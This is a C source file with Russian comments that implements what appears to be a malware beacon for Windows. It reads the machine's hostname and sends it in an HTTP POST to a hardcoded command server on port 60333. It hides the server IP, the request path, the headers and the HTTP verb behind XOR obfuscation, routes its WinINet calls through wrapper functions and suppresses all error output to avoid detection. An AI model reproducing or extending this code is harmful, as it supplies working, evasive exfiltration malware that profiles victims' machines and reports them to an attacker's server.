/*
InternetOpen        - открываем глобальный доступ к WinINet
InternetConnectA	- подключаемся к ip по заданному порту
HttpOpenRequestA	- готовим http post-запрос
HttpSendRequestA	- отправляем запрос с заголовками и телом
InternetReadFile	- читаем ответ сервера
InternetCloseHandle	- освобождаем ресурсы
*/

#include <windows.h>
#include <wininet.h>
#include <stdio.h>

/*
#pragma comment(lib, "wininet.lib")
*/

#include "proxy_funck.c"


int Post_Request(const char* ip, INTERNET_PORT port, const char *path, char *data,  const char *headers)
{
    const char *key = "MERYOAKJJAKDKVKAKQHKQKQDSCKGKWSK";

    DWORD dataLen = strlen(data);                       // Вычисляем длину тела запроса
    char buffer[4096];                                  // Длина тела запроса
    DWORD bytesRead;                                    // Кол-во реально прочитанных байтов

    HINTERNET hInternet = ProxyInternetOpenA(           // Инициализация WinInet сесии
        "WinInet_Post",                                 // Имя User-Agent-а (можно любое)
        INTERNET_OPEN_TYPE_DIRECT,                      // Подключение напрямую, без прокси
        NULL, NULL, 0);

    if (!hInternet) {
        // printf("InternetOpen failed: %lu\n", GetLastError());
        exit(1);
    }

    HINTERNET hConnect = ProxyInternetConnectA(              // Подключение к серверу по ip и порту
        hInternet,
        ip,
        port,
        NULL, NULL,
        INTERNET_SERVICE_HTTP,                          // Используем http
        0, 0
    );

    if (!hConnect) {
        // printf("InternetConnext failed: %lu\n", GetLastError());
        exit(1);
    }

    char temp_post[5] = {0x1D, 0x0A, 0x01, 0x0D, 0x00 };
    Xor_Encrypt(temp_post, strlen(temp_post), key);
    char *post = temp_post;

    HINTERNET hRequest = ProxyHttpOpenRequestA(         // Открытие http запроса типа post
        hConnect,
        // "POST",                                         // Метод запроса
        post,
        path,
        NULL,                                           // Версия http (NULL - по умолчанию)
        NULL,                                           // Рефер (не используем)
        NULL,                                           // Принятые типы (по умолчанию)
        INTERNET_FLAG_RELOAD,                           // Всегда загружать с сервера, не использовать кеш
        0
    );

    if (!ProxyHttpSendRequestA(                         // Отправка post запроса
        hRequest, 
        headers, 
        -1,                                             // Указываем, что мы сами добавили нультерминатор
        (LPVOID)data,                                   // Указатель на post данные
        dataLen)                                        // Длина тела запроса
    ) {          
        // printf("HttpSend failded: %lu\n", GetLastError);
        exit(1);
    }
    else {

        if(ProxyInternetReadFile(                            // Читаем ответ от сервера
            hRequest,
            buffer,                                     // Указатель на буфер, куда будет считан ответ
            sizeof(buffer) - 1,                         // Кол-во байт, которые мы готовы принять (1 байт под нультерминатор)
            &bytesRead)                                 // Сколько байт прочитали
            && bytesRead > 0
        ) {
            buffer[bytesRead] = '\0';                                               // Завершаем строку нультерминатором
            // printf("Response:\n%s\n", buffer);                                      // Выводим полученный ответ
        }
        else {
            // printf("InternetReadFile failed: %lu\n", GetLastError());
            exit(1);
        }
    };

    ProxyInternetCloseHandle(hRequest);
    ProxyInternetCloseHandle(hConnect);
    ProxyInternetCloseHandle(hInternet);
    
    return 0;
}


int Tapping()
{
    const char *key = "VCGTEQSLFLQLSDLFPLDFSDFA";

    char hostname[MAX_COMPUTERNAME_LENGTH + 1];             // Максимальный размер имени компьютера + 1 для '\0'
    DWORD size = sizeof(hostname);                          // Размер буфера для Hostname
    if (ProxyGetComputerNameA(hostname, &size)) {
        // printf("Hostname: %s\n", hostname);
    } else {
        // printf("Error GetComputerName: %lu\n", GetLastError());
        exit(1);
    }

    /*
    const char    *ip = "ip";
    INTERNET_PORT port = 60333;
    const char    *path = "/sdferwerdsfasdf";
    const char    *headers = "Content-Type: application/x-www-form-urlencoded";
    char data[MAX_COMPUTERNAME_LENGTH] = "15823405720242=";     // Ключ для того чтобы запрос был обработан + разделитель
    strncat(data, hostname, MAX_COMPUTERNAME_LENGTH - 1);       // Добавляем к data Hostname
    */

    char data[MAX_COMPUTERNAME_LENGTH] = "15823405720242=";     // По каким то причинам, если не посавить добавление Hostname вначале, он пападает в переменные ip и тд
    strncat(data, hostname, MAX_COMPUTERNAME_LENGTH - 1);      

    // const char temp_ip[] = { ip };
    char temp_ip[14] = { };
    Xor_Encrypt(temp_ip, strlen(temp_ip), key);
    const char *ip = temp_ip;

    INTERNET_PORT port = 60333;

    // const char temp_path[] = { '/','s','d','f','e','r','w','e','r','d','s','f','a','s','d','f','\0' };
    char temp_path[17] = {0x79, 0x30, 0x23, 0x32, 0x20, 0x23, 0x24, 0x29, 0x34, 0x28, 0x22, 0x2A, 0x32, 0x37, 0x28, 0x20, 0x00 };
    Xor_Encrypt(temp_path, strlen(temp_path), key);
    const char *path = temp_path;
   
    // const char temp_headers[] = { 'C','o','n','t','e','n','t','-','T','y','p','e',':',' ','a','p','p','l','i','c','a','t','i','o','n','/','x','-','w','w','w','-','f','o','r','m','-','u','r','l','e','n','c','o','d','e','d','\0' };
    char temp_headers[48] = {0x15, 0x2C, 0x29, 0x20, 0x20, 0x3F, 0x27, 0x61, 0x12, 0x35, 0x21, 0x29, 0x69, 0x64, 0x2D, 0x36, 0x20, 0x20, 0x2D, 0x25, 0x32, 0x30, 0x2F, 0x2E, 0x38, 0x6C, 0x3F, 0x79, 0x32, 0x26, 0x24, 0x61, 0x20, 0x23, 0x23, 0x21, 0x7E, 0x31, 0x3E, 0x2A, 0x35, 0x22, 0x27, 0x29, 0x37, 0x21, 0x22, 0x00 };
    Xor_Encrypt(temp_headers, strlen(temp_headers), key);
    const char *headers = temp_headers;

    Post_Request(ip, port, path, data, headers);

    return 0;
}